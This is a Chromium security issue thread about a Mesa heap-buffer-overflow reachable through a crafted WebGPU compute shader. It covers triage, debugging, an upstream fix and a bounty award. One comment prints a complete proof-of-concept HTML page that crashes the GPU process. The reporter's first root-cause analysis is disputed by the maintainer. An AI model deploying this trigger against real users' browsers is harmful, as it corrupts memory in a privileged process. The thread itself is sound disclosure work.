# GPU process crash via WebGPU compute shader (Linux)

| Field | Value |
|-------|-------|
| **Issue ID** | [386565127](https://issues.chromium.org/issues/386565127) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Linux, ChromeOS |
| **Chrome Version** | 131.0.6778.0 |
| **Reporter** | du...@gmail.com |
| **Assignee** | ms...@google.com |
| **Created** | 2024-12-29 |
| **Bounty** | $15,000.00 |

## Description

# Steps to reproduce the problem

1. Compile Mesa with commit lastest a0918ca13d3ae5c0bf51e327291ca94c09ff3233, ensuring ASAN is enabled.
2. Download chromium ASAN from <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/tools/get_asan_chrome/>
3. Run chrome ASAN build official which uses an ASAN build of Mesa. Launching the browser requires a couple of non-standard flags to enable WebGPU on Ubuntu (--enable-unsafe-webgpu --enable-features=Vulkan).

```
ASAN_OPTIONS=detect_odr_violation=0:detect_container_overflow=0 VK_DRIVER_FILES=/home/kyr04i/mesa_asan_lastest/intel_icd.x86_64.json ./chrome --no-sandbox --enable-unsafe-webgpu --enable-features=Vulkan --disable-gpu-watchdog

```

4. Attached is a .html file containing a WebGPU compute shader. Opening the attached html crashes the GPU Process. The corresponding ASAN crash is generated:

```
[3733:3733:1227/201329.512705:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not part of the idle inhibition specification: https://specifications.freedesktop.org/idle-inhibit-spec/latest/
=================================================================
==3768==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b33c16f4230 at pc 0x78a3b8f08ef2 bp 0x78a3a1dfcc50 sp 0x78a3a1dfcc48
READ of size 8 at 0x7b33c16f4230 thread T9 (ThreadPoolForeg)
    #0 0x78a3b8f08ef1 in brw_inst_bits /build/mesa/buildASAN/../src/intel/compiler/brw_inst.h:1198:12

```
# Problem Description

Chromium translates wgsl shaders via tint to an OS-specific shader format. On Linux, the OS-specific file format is SPIRV. Once the shader is compiled into SPIRV, it is handed to Vulkan driver (provided by Mesa). On ChromeOS, Mesa is the default graphics driver. The issue arises during the compilation of compute shader in Mesa.

**VULNERABILITY DETAILS**

During the compilation of the compute shader, `brw_init_codegen` is called to allocate an array with a size of 1024 for storing instructions [1].

`brw_next_insn` ensures that the total number of instructions does not exceed the store size. If found that isn't enough, then it will double store size [2].

However, if the store size equals `new_nr_insn` in [A], the `store` buffer will not be updated. [3]

```
static brw_inst *
brw_append_insns(struct brw_codegen *p, unsigned nr_insn, unsigned alignment)
{
   assert(util_is_power_of_two_or_zero(sizeof(brw_inst)));
   assert(util_is_power_of_two_or_zero(alignment));
   const unsigned align_insn = MAX2(alignment / sizeof(brw_inst), 1);
   const unsigned start_insn = ALIGN(p->nr_insn, align_insn);
   const unsigned new_nr_insn = start_insn + nr_insn;

   if (p->store_size < new_nr_insn) { /\*\*\* A \*\*\*/
      p->store_size = util_next_power_of_two(new_nr_insn * sizeof(brw_inst));
      p->store = reralloc(p->mem_ctx, p->store, brw_inst, p->store_size);
   }
  // ...
}

```

It leads to a heap-buffer-overflow in the GPU process if the compute shader generates more than 1024 instructions, reachable from an uncompromised renderer process.

[1] <https://gitlab.freedesktop.org/mesa/mesa/-/blob/main/src/intel/compiler/brw_eu.c#L261>

[2] <https://gitlab.freedesktop.org/mesa/mesa/-/blob/main/src/intel/compiler/brw_eu_emit.c#L450>

[3] <https://gitlab.freedesktop.org/mesa/mesa/-/blob/main/src/intel/compiler/brw_eu_emit.c#L405>

# Summary

GPU process crash via WebGPU compute shader (Linux)

# Additional Data

Category: Security   

Chrome Channel: Dev   

Regression: N/A

## Attachments

- [poc.html](attachments/poc.html) (text/html, 629.3 KB)
- [asan.txt](attachments/asan.txt) (text/plain, 18.8 KB)
- [poc.html](attachments/poc.html) (text/html, 5.5 KB)
- [Dockerfile](attachments/Dockerfile) (application/octet-stream, 1.5 KB)
- [poc_mesa-iris.html](attachments/poc_mesa-iris.html) (text/html, 5.4 KB)
- [gfxrecon_capture_20250116T002029.gfxr](attachments/gfxrecon_capture_20250116T002029.gfxr) (application/octet-stream, 672.5 KB)

## Timeline

### du...@gmail.com (2024-12-29)

On Sun, Dec 29, 2024 at 2:42 PM <buganizer-system@google.com> wrote:

> Replying to this email means your email address will be shared with the
> team that works on this product.
> https://issues.chromium.org/issues/386565127
>
> *Reference Info: 386565127 GPU process crash via WebGPU compute shader
> (Linux)*
> component:  Public Trackers > 1362134 > Chromium
> <https://issues.chromium.org/components/1363614>
> status:  New
> reporter:  duynguyen45608@gmail.com
> cc:  duynguyen45608@gmail.com
> collaborators:  se...@chromium.org
> type:  Vulnerability
> access level:  Limited visibility
> priority:  P4
> severity:  S4
> hotlist:  Unconfirmed <https://issues.chromium.org/hotlists/5437934>
> retention:  Component default
> BuildNumber:  131.0.6778.0
> OS:  ChromeOS
>
>
> poc.html
> View
> <https://issues.chromium.org/action/issues/386565127/attachments/61826743?download=false>
> Download
> <https://issues.chromium.org/action/issues/386565127/attachments/61826743?download=true>
>
> asan.txt
> View
> <https://issues.chromium.org/action/issues/386565127/attachments/61826744?download=false>
> Download
> <https://issues.chromium.org/action/issues/386565127/attachments/61826744?download=true>
>
> *ch...@google.com <ch...@google.com> added comment #1
> <https://issues.chromium.org/issues/386565127#comment1>:*
> Steps to reproduce the problem
>
>    1. Compile Mesa with commit lastest
>    a0918ca13d3ae5c0bf51e327291ca94c09ff3233, ensuring ASAN is enabled.
>    2. Download chromium ASAN from
>    https://chromium.googlesource.com/chromium/src/+/refs/heads/main/tools/get_asan_chrome/
>    3. Run chrome ASAN build official which uses an ASAN build of Mesa.
>    Launching the browser requires a couple of non-standard flags to enable
>    WebGPU on Ubuntu (--enable-unsafe-webgpu --enable-features=Vulkan).
>
> ASAN_OPTIONS=detect_odr_violation=0:detect_container_overflow=0 VK_DRIVER_FILES=/home/kyr04i/mesa_asan_lastest/intel_icd.x86_64.json ./chrome --no-sandbox --enable-unsafe-webgpu --enable-features=Vulkan --disable-gpu-watchdog
>
>
>    4. Attached is a .html file containing a WebGPU compute shader.
>    Opening the attached html crashes the GPU Process. The corresponding ASAN
>    crash is generated:
>
> [3733:3733:1227/201329.512705:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not part of the idle inhibition specification: https://specifications.freedesktop.org/idle-inhibit-spec/latest/
> =================================================================
> ==3768==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b33c16f4230 at pc 0x78a3b8f08ef2 bp 0x78a3a1dfcc50 sp 0x78a3a1dfcc48
> READ of size 8 at 0x7b33c16f4230 thread T9 (ThreadPoolForeg)
>     #0 0x78a3b8f08ef1 in brw_inst_bits /build/mesa/buildASAN/../src/intel/compiler/brw_inst.h:1198:12
>
> Problem Description
>
> Chromium translates wgsl shaders via tint to an OS-specific shader format.
> On Linux, the OS-specific file format is SPIRV. Once the shader is compiled
> into SPIRV, it is handed to Vulkan driver (provided by Mesa). On ChromeOS,
> Mesa is the default graphics driver. The issue arises during the
> compilation of compute shader in Mesa.
>
> *VULNERABILITY DETAILS*
>
> During the compilation of the compute shader, brw_init_codegen is called
> to allocate an array with a size of 1024 for storing instructions [1].
>
> brw_next_insn ensures that the total number of instructions does not
> exceed the store size. If found that isn't enough, then it will double
> store size [2].
>
> However, if the store size equals new_nr_insn in [A], the store buffer
> will not be updated. [3]
>
> static brw_inst *
> brw_append_insns(struct brw_codegen *p, unsigned nr_insn, unsigned alignment)
> {
>    assert(util_is_power_of_two_or_zero(sizeof(brw_inst)));
>    assert(util_is_power_of_two_or_zero(alignment));
>    const unsigned align_insn = MAX2(alignment / sizeof(brw_inst), 1);
>    const unsigned start_insn = ALIGN(p->nr_insn, align_insn);
>    const unsigned new_nr_insn = start_insn + nr_insn;
>
>    if (p->store_size < new_nr_insn) { /\*\*\* A \*\*\*/
>       p->store_size = util_next_power_of_two(new_nr_insn * sizeof(brw_inst));
>       p->store = reralloc(p->mem_ctx, p->store, brw_inst, p->store_size);
>    }
>   // ...
> }
>
> It leads to a heap-buffer-overflow in the GPU process if the compute
> shader generates more than 1024 instructions, reachable from an
> uncompromised renderer process.
>
> [1]
> https://gitlab.freedesktop.org/mesa/mesa/-/blob/main/src/intel/compiler/brw_eu.c#L261
>
> [2]
> https://gitlab.freedesktop.org/mesa/mesa/-/blob/main/src/intel/compiler/brw_eu_emit.c#L450
>
> [3]
> https://gitlab.freedesktop.org/mesa/mesa/-/blob/main/src/intel/compiler/brw_eu_emit.c#L405
> Summary
>
> GPU process crash via WebGPU compute shader (Linux)
> Additional Data
>
> Category: Security
> Chrome Channel: Dev
> Regression: N/A
>
>
>
> Generated by Google IssueTracker notification system.
>
> You're receiving this email because you are subscribed to updates on
> Google IssueTracker issue 386565127
> <https://issues.chromium.org/issues/386565127> where you have the roles:
> new issue
> Unsubscribe from this issue.
> <https://issues.chromium.org/issues/386565127?unsubscribe=true>
>


### ts...@chromium.org (2024-12-30)

Could you provide a minimized PoC for us? In the mean time, uploading as an untrusted job to CF.

### cl...@appspot.gserviceaccount.com (2024-12-30)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4980780790906880.

### ts...@google.com (2024-12-30)

CC'ing per shepherding guidlines.

### ts...@google.com (2024-12-30)

Assigning per previous issue 384531062

### du...@gmail.com (2024-12-31)

Forgot to upload the minimized PoC. Basically, this compute shader generates exactly 1024 instructions in Mesa driver, so it's quite long.
Run chrome which uses an ASAN build of Mesa (commit lastest a0918ca13d3ae5c0bf51e327291ca94c09ff3233) . Setting up Mesa ASAN is quite similar to this issue [https://issues.chromium.org/issues/359909532#comment5]

### pa...@chromium.org (2024-12-31)

[sepherd] setting found-in extended-stable, actual determination is still needed.

### pe...@google.com (2025-01-01)

Setting milestone because of s0/s1 severity.

### ds...@chromium.org (2025-01-06)

@msturner are you the correct person to send these Mesa issues too?

### ms...@google.com (2025-01-06)

Yes, I'll take a look.

### du...@gmail.com (2025-01-10)

I did test with `chromiumos/third_party/mesa` on branch `chromeos-iris` (the version that is used by ChromeOS with WebGPU enabled) using lastest commit `fbafe5697750b35984bfa327147ad2a362a70ea5`. To test this branch, a minor modification to [poc.html](https://issues.chromium.org/issues/386565127#comment7) is required. Additionally, the attached `Dockerfile` can be used to build `libvulkan_intel.so` and `intel_icd.x86_64.json`.

Assuming you have a device with an Intel GPU, running this HTML file should trigger ASAN crashes.

```
kyr04i@ubuntu:~/chromium/src/tools/get_asan_chrome$ ASAN_OPTIONS=detect_odr_violation=0:detect_container_overflow=0 VK_DRIVER_FILES=/home/kyr04i/mesa/intel_icd.x86_64.json ./chrome --enable-features=Vulkan --disable-gpu-watchdog --no-sandbox  --enable-unsafe-webgpu
[30759:30759:0110/142514.116643:ERROR:object_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not part of the idle inhibition specification: https://specifications.freedesktop.org/idle-inhibit-spec/latest/
=================================================================
==30794==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x780565877230 at pc 0x75753eb81642 bp 0x757538bfc510 sp 0x757538bfc508
READ of size 8 at 0x780565877230 thread T18 (ThreadPoolForeg)


```

### ms...@google.com (2025-01-13)

Thanks, I'm taking a look at this now. I've reproduced the issue.

### ms...@google.com (2025-01-13)

I am able to reproduce the issue on ChromeOS with our current mesa-iris branch (commit fbafe5697750b35984bfa327147ad2a362a70ea5). I cannot reproduce the issue with the upstream main branch (commit 7c927144b33003b574f06f5d001264c0a615d035).

Can you attach a gfxreconstruct trace that reproduces the issue?

### du...@gmail.com (2025-01-14)

Does the `poc` attached in [#comment7](https://issues.chromium.org/issues/386565127#comment7) reproduce the issue? Have you tried it yet? I have reproduced the issue with commit [7c927144b33003b574f06f5d001264c0a615d035] using this poc.

### ms...@google.com (2025-01-14)

Yes, `poc_mesa-iris.html` from [comment #7](https://issues.chromium.org/issues/386565127#comment7) reproduces the issue with our current mesa-iris branch (commit fbafe5697750b35984bfa327147ad2a362a70ea5).

I cannot reproduce the issue with the upstream main branch (commit 7c927144b33003b574f06f5d001264c0a615d035).

Can you attach a gfxreconstruct trace that reproduces the issue?

### du...@gmail.com (2025-01-14)

No, `poc_mesa-iris.html` is from [comment #12](https://issues.chromium.org/issues/386565127#comment12). But sure, I will add a gfxreconstruct trace for reproducing that. Wait for me a bit.

### ms...@google.com (2025-01-14)

FWIW, I don't see any evidence that the analysis around `brw_append_insns` is correct. I instrumented the code and confirmed that it was resizing `p->store` appropriately.

`asan.txt` in the initial report shows that the crash happens in the instruction compaction code (`brw_compact_instructions`) which is called after the whole program is constructed (where `brw_append_insns` is used).

It also shows that the memory was allocated here:

```
    #4 0x78a3b8effa62 in brw_init_codegen /build/mesa/buildASAN/../src/intel/compiler/brw_eu.c:261:15

```

which corresponds to this line in `commit a0918ca13d3ae5c0bf51e327291ca94c09ff3233`:

```
   p->store = rzalloc_array(mem_ctx, brw_inst, p->store_size);

```

So, the memory is has not been reallocated by `brw_append_insns`.

### ms...@google.com (2025-01-14)

> No, poc\_mesa-iris.html is from [comment #12](https://issues.chromium.org/issues/386565127#comment12). But sure, I will add a gfxreconstruct trace for reproducing that. Wait for me a bit.

Oh, sorry. I was confused. I'll try `poc.html` from [comment #7](https://issues.chromium.org/issues/386565127#comment7).

(In any case, a gfxreconstruct would help me significantly)

### ms...@google.com (2025-01-14)

With Mesa `commit a0918ca13d3ae5c0bf51e327291ca94c09ff3233`, poc.html from [comment #7](https://issues.chromium.org/issues/386565127#comment7) doesn't reproduce the issue for me on ChromeOS.

### du...@gmail.com (2025-01-14)

Oh. I confirmed it reproduced in both commit `a0918ca13d3ae5c0bf51e327291ca94c09ff3233` and `7c927144b33003b574f06f5d001264c0a615d035`. So I wonder how to generate a gfxreconstruct trace ?

### ms...@google.com (2025-01-14)

FWIW, I applied this patch to Mesa:

```
diff --git a/src/intel/compiler/brw_eu_emit.c b/src/intel/compiler/brw_eu_emit.c
index c22fd1435b4c..83b8bedcec21 100644
--- a/src/intel/compiler/brw_eu_emit.c
+++ b/src/intel/compiler/brw_eu_emit.c
@@ -396,8 +396,10 @@ brw_append_insns(struct brw_codegen *p, unsigned nr_insn, unsigned alignment)
    const unsigned start_insn = ALIGN(p->nr_insn, align_insn);
    const unsigned new_nr_insn = start_insn + nr_insn;
 
+   printf("store_size[0..%d]; storing new_insn into store_size[%d] (align_insn = %u, start_insn = %u, new_nr_insn = %u, nr_insn = %u, p->nr_insn = %u)\n", p->store_size-1, start_insn, align_insn, start_insn, new_nr_insn, nr_insn, p->nr_insn);
    if (p->store_size < new_nr_insn) {
       p->store_size = util_next_power_of_two(new_nr_insn * sizeof(brw_inst));
+      printf("DEBUG RESIZE: store_size = %d\n", p->store_size);
       p->store = reralloc(p->mem_ctx, p->store, brw_inst, p->store_size);
    }
 
@@ -419,6 +421,7 @@ brw_append_insns(struct brw_codegen *p, unsigned nr_insn, unsigned alignment)
 void
 brw_realign(struct brw_codegen *p, unsigned alignment)
 {
+   printf("DEBUG REALIGN: brw_realign(p, %u)\n", alignment);
    brw_append_insns(p, 0, alignment);
 }
 
@@ -426,6 +429,7 @@ int
 brw_append_data(struct brw_codegen *p, void *data,
                 unsigned size, unsigned alignment)
 {
+   printf("DEBUG APPEND: brw_append_data(p, ..., %u)\n", alignment);
    unsigned nr_insn = DIV_ROUND_UP(size, sizeof(brw_inst));
    void *dst = brw_append_insns(p, nr_insn, alignment);
    memcpy(dst, data, size);

```

And saw this in `/var/log/ui/ui.LATEST` on ChromeOS when I opened `poc.html`:

```
[...]
store_size[0..1023]; storing new_insn into store_size[1023] (align_insn = 1, start_insn = 1023, new_nr_insn = 1024, nr_insn = 1, p->nr_insn = 1023)
store_size[0..1023]; storing new_insn into store_size[1024] (align_insn = 1, start_insn = 1024, new_nr_insn = 1025, nr_insn = 1, p->nr_insn = 1024)
DEBUG RESIZE: store_size = 32768
store_size[0..32767]; storing new_insn into store_size[1025] (align_insn = 1, start_insn = 1025, new_nr_insn = 1026, nr_insn = 1, p->nr_insn = 1025)
store_size[0..32767]; storing new_insn into store_size[1026] (align_insn = 1, start_insn = 1026, new_nr_insn = 1027, nr_insn = 1, p->nr_insn = 1026)
[...]

```

### du...@gmail.com (2025-01-15)

Here is my log when open the `poc.html` using your patch

```
[...]
store_size[0..1023]; storing new_insn into store_size[1022] (align_insn = 1, start_insn = 1022, new_nr_insn = 1023, nr_insn = 1, p->nr_insn = 1022)
store_size[0..1023]; storing new_insn into store_size[1023] (align_insn = 1, start_insn = 1023, new_nr_insn = 1024, nr_insn = 1, p->nr_insn = 1023)
=================================================================
==83425==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7a4d4c2c2230 at pc 0x77bd42908ef2 bp 0x77bd2b7fab10 sp 0x77bd2b7fab08
READ of size 8 at 0x7a4d4c2c2230 thread T9 (ThreadPoolForeg)
[...]

```

Commit

```
root@230f5df2f799:/build/mesa# git log
commit a0918ca13d3ae5c0bf51e327291ca94c09ff3233 (HEAD)
[...]

```

Poc

```
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Reproduce</title>
  </head>
  <body>
    <canvas width="512" height="512"></canvas>
    <script type="module">
      const canvas = document.querySelector("canvas");
      if (!navigator.gpu) {
        throw new Error("WebGPU not supported on this browser.");
      }
      async function main() {
        const adapter = await navigator.gpu.requestAdapter();
        if (!adapter) {
          throw new Error("No appropriate GPUAdapter found.");
        }
        const device = await adapter.requestDevice();
        
        const outputBufferSize = 200*32; 
        const outputBuffer = device.createBuffer({
          size: outputBufferSize,
          usage: GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST | GPUBufferUsage.STORAGE,
        });
        
        function generateShaderCode() {
          const workgroupSize = 4; 
          const elementsPerRow = 3; 
          let shaderCode = `
            struct AF {
              low: u32,
              high: u32,
            };
            struct Output {
              @size(200) value: array<array<AF, 5>, 5>,
            };
            @group(0) @binding(0) var<storage, read_write> outputs: array<Output, 32>;
            @compute @workgroup_size(1)
            fn main() {
          `;
          for (let k = 0; k < 30; k++) {
            for (let i = 0; i < workgroupSize; i++) {
              for (let j = 0; j < elementsPerRow; j++) {
                shaderCode += `
                  { 
                    const kExponentBias = 1022;
                    const subnormal_or_zero: bool = (((-0.125) * (mat4x3(
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308
                    )))[${i}][${j}] <= 2.225073858507201e-308) && (((-0.125) * (mat4x3(
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308
                    )))[${i}][${j}] >= -2.225073858507201e-308);
                    const sign_bit: u32 = select(0, 0x80000000, ((-0.125) * (mat4x3(
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308
                    )))[${i}][${j}] < 0);
                    const f = frexp(abs(((-0.125) * (mat4x3(
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308,
                      -1.7976931348623157e+308, -1.7976931348623157e+308, -1.7976931348623157e+308
                    )))[${i}][${j}]));
                    const f_fract = select(f.fract, 0, subnormal_or_zero);
                    const f_exp = select(f.exp, -kExponentBias, subnormal_or_zero);
                    const exponent_bits: u32 = (f_exp + kExponentBias) << 20;
                    const high_mantissa = ldexp(f_fract, 21);
                    const high_mantissa_bits: u32 = u32(ldexp(f_fract, 21)) & 0x000fffff;
                    const low_mantissa = f_fract - ldexp(floor(high_mantissa), -21);
                    const low_mantissa_bits = u32(ldexp(low_mantissa, 53));
                    outputs[${k}].value[${i}][${j}].high = sign_bit | exponent_bits | high_mantissa_bits;
                    outputs[${k}].value[${i}][${j}].low = low_mantissa_bits;
                    outputs[${k}].value[1][3].high = sign_bit | exponent_bits | high_mantissa_bits;
                  }
                `;
              }
            }
          } 
          for (let r = 0; r < 13; r++){
            shaderCode += `
            outputs[${r}].value[3][3].high = 4;
            `
          }
          shaderCode += `
            }
          `;
          return shaderCode;
        }
        const source = generateShaderCode();
        const module = device.createShaderModule({ code: source });
        const pipeline = await device.createComputePipelineAsync({
          layout: 'auto',
          compute: { module, entryPoint: 'main' },
        });
        const group = device.createBindGroup({
          layout: pipeline.getBindGroupLayout(0),
          entries: [{ binding: 0, resource: { buffer: outputBuffer } }],
        });
        const encoder = device.createCommandEncoder();
        const pass = encoder.beginComputePass();
        pass.setPipeline(pipeline);
        pass.setBindGroup(0, group);
        pass.dispatchWorkgroups(1);
        pass.end();
        device.queue.submit([encoder.finish()]);
        device.queue.onSubmittedWorkDone().then(() => {
          console.log("done");
        });
      }
      main();
    </script>
  </body>
</html>

```

### du...@gmail.com (2025-01-15)

I have no idea why it different between u and me when using the same commit. But, I assure that this branch/commit also affect.

### ms...@google.com (2025-01-15)

Oh, very interesting.

My guess is that we're testing on different intel GPUs and the resulting assembly is slightly different.

What is the output of `lspci -s 0:2 -nn` on your system? Here's mine:

```
screebo-rev2 ~ # lspci -s 0:2 -nn
00:02.0 VGA compatible controller [0300]: Intel Corporation Meteor Lake-P [Intel Graphics] [8086:7d45] (rev 08)

```

### du...@gmail.com (2025-01-15)

Here is mine:

```
kyr04i@ubuntu:~$ lspci -s 0:2 -nn
0000:00:02.0 Display controller [0380]: Intel Corporation Alder Lake-P GT1 [UHD Graphics] [8086:46a3] (rev 0c)

```

**My GPU is 12th Gen GPUs (i5-12500H)**

### ms...@google.com (2025-01-15)

Thanks!

To create a gfxreconstruct trace, run a program (i.e. the browser) with these environment variables set:

```
VK_LAYER_PATH=~/src/gfxreconstruct/build/layer/$VK_LAYER_PATH
VK_INSTANCE_LAYERS=VK_LAYER_LUNARG_gfxreconstruct

```

gfxreconstruct is available here: <https://github.com/LunarG/gfxreconstruct/>

### du...@gmail.com (2025-01-15)

Does it require to run chrome asan for generating the trace ?

### ms...@google.com (2025-01-15)

No, it does not require ASan.

### du...@gmail.com (2025-01-15)

Thanks, wait me for a while

### du...@gmail.com (2025-01-15)

First, I rebuild a non-asan mesa

```
[...]
RUN cd mesa && \
    git checkout a0918ca13d3ae5c0bf51e327291ca94c09ff3233 && \
    mkdir buildASAN && \
    cd buildASAN && \
    LLVM_CONFIG=/usr/bin/llvm-config-18 CC=clang-18 CXX=clang++-18 meson .. && \
    meson configure -Db_ndebug=true && \
    meson configure -Db_lundef=false 
[...]

```

Run chrome with these environment variables set:

```
export VK_LAYER_PATH=/home/kyr04i/gfxreconstruct/build/layer/:$VK_LAYER_PATH 
export VK_INSTANCE_LAYERS=VK_LAYER_LUNARG_gfxreconstruct 
export VK_DRIVER_FILES=/home/kyr04i/gfxr/intel_icd.x86_64.json

```

`./chrome --no-sandbox --enable-unsafe-webgpu --enable-features=Vulkan --disable-gpu-watchdog http://localhost:8003/poc.html`

The corresponding trace file attached below is generated:

### ms...@google.com (2025-01-16)

Thanks a bunch!

I can reproduce the problem on upstream main with the trace on an Alderlake system! \o/

### ms...@google.com (2025-01-16)

Okay, I've got a fix.

I'll file an issue upstream with the reproduction steps and make a merge request with the fix.

### ms...@google.com (2025-01-17)

- Upstream issue: <https://gitlab.freedesktop.org/mesa/mesa/-/issues/12486>
- Upstream merge request: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/33101>

If you can, please confirm that the fixes work for you. (You can get a `git am`-able patch from <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/33101.patch>)

### du...@gmail.com (2025-01-17)

Thanks for the fix. I confirmed that this vulnerability has been fixed.

### ap...@google.com (2025-01-23)

Project: chromiumos/third\_party/mesa  

Branch: chromeos-iris  

Author: Matt Turner <[mattst88@gmail.com](mailto:mattst88@gmail.com)>  

Link:      <https://chromium-review.googlesource.com/6191407>

UPSTREAM: brw: Avoid reading past the end of `p->store`

---


Expand for full commit details
```
UPSTREAM: brw: Avoid reading past the end of `p->store` 
 
On the last iteration of the loop, `offset` will point to the location 
just beyond the last instruction in the program. If the program exactly 
fills `p->store` then calling `next_offset()` will read out of bounds. 
 
Instead just let the inner while loop call `next_offset()` one 
additional time. 
 
Fixes: a35b9cb6254 ("i965: Add annotation data structure and support code.") 
Closes: https://gitlab.freedesktop.org/mesa/mesa/-/issues/12486 
Reviewed-by: Caio Oliveira <caio.oliveira@intel.com> 
Part-of: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/33101> 
(cherry picked from commit a4f0a96dda419f9d2cac36d322e828da51fb9181 
 https://gitlab.freedesktop.org/mesa/mesa.git main) 
 
BUG=b:386565127 
TEST=Run crafted WebGPU shader without crashing 
 
Change-Id: Ice93fb2d8c61c98275b64276f49756ab1174ebc2 
Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6191407 
Commit-Queue: Lina Versace <linyaa@google.com> 
Commit-Queue: Matt Turner <msturner@google.com> 
Tested-by: Matt Turner <msturner@google.com> 
Auto-Submit: Matt Turner <msturner@google.com> 
Reviewed-by: Lina Versace <linyaa@google.com> 
Reviewed-by: Sean Paul <sean@poorly.run>

```

---

Files:

- M `src/intel/compiler/brw_eu_compact.c`

---

Hash: 18b3156f9356fc593d69e26c415edb6c007880d4  

Date:  Thu Jan 16 22:27:00 2025


---

### ms...@google.com (2025-01-23)

Cherry picked the upstream patch back to our `chromeos-iris` branch. Now fixed. Thanks for the report!

(Somewhat incredibly, this was a bug that *I* introduced in 2014)

### pe...@google.com (2025-01-23)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2025-01-23)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ms...@google.com (2025-01-27)

> 1. Was this issue a regression for the milestone it was found in?

No.

> 2. Is this issue related to a change or feature merged after the latest LTS Milestone?

No.

### pe...@google.com (2025-01-27)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ms...@google.com (2025-01-27)

I received this email, and I don't know what I'm doing wrong.

```
Changed
status:  Fixed → Assigned
Fixed By Code Changes:  https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6191407 → <none>

peeps-workflow-peeps-continuous-blintz@prod.google.com added comment #41:
Dear owner, thanks for fixing this bug. We've reopened it because:

Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: https://<host>-review.googlesource.com/c/<repo>/+/<change_number> or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

```

### am...@chromium.org (2025-01-27)

Thanks for the work on this, msturner@ and apologies for the confusion with this automation.

`fixed by code changes` is what we use to track the given CL associated with resolution of a given issue and feeds into some of our release and security bug process automation; since this is an issue in the Mesa drive and resolved by an upstream fix, I've added NA to the field to keep this issue closed as Fixed.

### sp...@google.com (2025-02-06)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $15000.00 for this report.

Rationale for this decision:
high-quality report of memory corruption in a highly-privileged process (GPU)


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

